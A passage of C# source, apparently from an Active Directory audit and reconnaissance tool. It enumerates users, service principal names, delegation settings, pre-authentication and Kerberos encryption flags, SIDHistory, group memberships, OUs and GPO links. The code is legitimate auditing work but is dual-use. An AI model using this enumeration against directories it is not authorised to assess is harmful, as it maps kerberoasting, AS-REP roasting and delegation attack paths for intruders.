                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) == "0")
                    {
                        if ((bool) AdUser.Members["PasswordNeverExpires"].Value == false)
                        {
                            MustChangePasswordatLogon = true;
                        }
                    }
                    if (AdUser.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdUser.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                    //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 9223372036854775807)
                    //{
                        //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 0)
                        if (AdUser.Members["AccountExpirationDate"].Value != null)
                        {
                            try
                            {
                                //AccountExpires = DateTime.FromFileTime((long)(AdUser.Members["accountExpires"].Value));
                                // AccountExpirationDate is accountExpires converted to local time
                                AccountExpires = Convert.ToDateTime(AdUser.Members["AccountExpirationDate"].Value);
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //Console.WriteLine("Exception caught: {0}", e);
                            }
                        }
                    //}
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    if (AdUser.Members["msDS-SupportedEncryptionTypes"].Value != null)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Members["msDS-SupportedEncryptionTypes"].Value;
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    if (AdUser.Members["UserAccountControl"].Value != null)
                    {
                        AccountNotDelegated = !((bool) AdUser.Members["AccountNotDelegated"].Value);
                        if ((bool) AdUser.Members["TrustedForDelegation"].Value)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Members["msDS-AllowedToDelegateTo"] != null)
                        {
                            Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["msDS-AllowedToDelegateTo"].Value;
                            if (delegateto.Value != null)
                            {
                                DelegationType = "Constrained";
                                foreach (var value in delegateto)
                                {
                                    DelegationServices = DelegationServices + "," + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(',');
                            }
                        }
                        if ((bool) AdUser.Members["TrustedToAuthForDelegation"].Value == true)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        HasSPN = false;
                    }
                    else
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdUser.Members["SamAccountName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", AdUser.Members["CannotChangePassword"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", AdUser.Members["PasswordNeverExpires"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", AdUser.Members["AllowReversiblePasswordEncryption"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", AdUser.Members["SmartcardLogonRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", AccountNotDelegated));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", AdUser.Members["UseDESKeyOnly"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", AdUser.Members["DoesNotRequirePreAuth"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AdUser.Members["LockedOut"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", AdUser.Members["PasswordExpired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", AdUser.Members["PasswordNotRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", AdUser.Members["LogonWorkstations"].Value));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", AdUser.Members["AdminCount"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", AdUser.Members["primaryGroupID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SID", AdUser.Members["SID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", CleanString(AdUser.Members["Description"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Title", CleanString(AdUser.Members["Title"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Department", CleanString(AdUser.Members["Department"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Company", CleanString(AdUser.Members["Company"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Manager", CleanString(AdUser.Members["Manager"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Info", CleanString(AdUser.Members["Info"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", CleanString(AdUser.Members["Mobile"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Email", CleanString(AdUser.Members["mail"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", AdUser.Members["homeDirectory"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", AdUser.Members["profilePath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", AdUser.Members["ScriptPath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", AdUser.Members["UserAccountControl"].Value));
                    UserObj.Members.Add(new PSNoteProperty("First Name", CleanString(AdUser.Members["givenName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", CleanString(AdUser.Members["middleName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", CleanString(AdUser.Members["sn"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Country", CleanString(AdUser.Members["c"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", AdUser.Members["whenCreated"].Value));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", AdUser.Members["whenChanged"].Value));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdUser.Members["DistinguishedName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", CleanString(AdUser.Members["CanonicalName"].Value)));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Members["userAccountControl"].Value != null)
                    {
                        var userFlags = (UACFlags) AdUser.Members["userAccountControl"].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) != "0")
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)AdUser.Members["pwdLastSet"].Value);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberOfAttribute = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["memberof"].Value;
                    if (MemberOfAttribute.Value != null)
                    {
                        foreach (string Member in MemberOfAttribute)
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    string Description = CleanString(AdUser.Members["Description"].Value);
                    string PrimaryGroupID = Convert.ToString(AdUser.Members["primaryGroupID"].Value);
                    foreach (string SPN in SPNs)
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("Username", CleanString(AdUser.Members["SamAccountName"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string ManagedByValue = Convert.ToString(AdGroup.Members["managedBy"].Value);
                    string ManagedBy = "";
                    string SIDHistory = "";

                    if (AdGroup.Members["managedBy"].Value != null)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Members["SamAccountName"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", AdGroup.Members["AdminCount"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", AdGroup.Members["GroupCategory"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", AdGroup.Members["GroupScope"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", AdGroup.Members["sid"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", CleanString(AdGroup.Members["Description"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Members["whenCreated"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Members["whenChanged"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Members["CanonicalName"].Value));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection ReplValueMetaData = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["msDS-ReplValueMetaData"].Value;

                    if (ReplValueMetaData.Value != null)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Members["SamAccountName"].Value));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    ADWSClass.AdGroupDictionary.Add((Convert.ToString(AdGroup.Properties["SID"].Value)), (Convert.ToString(AdGroup.Members["SamAccountName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // based on https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    PSObject AdGroup = (PSObject) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = Convert.ToString(AdGroup.Members["samaccounttype"].Value);
                    string ObjectClass = Convert.ToString(AdGroup.Members["ObjectClass"].Value);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberUserName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberName = null;
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdOU = (PSObject) record;
                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Members["Name"].Value));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", AdOU.Members["Description"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Members["whenCreated"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Members["whenChanged"].Value));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Members["DistinguishedName"].Value));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Members["DisplayName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Members["Name"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Members["whenCreated"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Members["whenChanged"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Members["DistinguishedName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Members["gPCFileSysPath"].Value));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;
                    ADWSClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Members["DistinguishedName"].Value).ToUpper()), (Convert.ToString(AdGPO.Members["DisplayName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSOM = (PSObject) record;
                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = Convert.ToString(AdSOM.Members["gPLink"].Value);
                    string GPOName = null;

                    Depth = (Convert.ToString(AdSOM.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1;
                    if (AdSOM.Members["gPOptions"].Value != null && (int) AdSOM.Members["gPOptions"].Value == 1)
                    {
                        BlockInheritance = true;
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
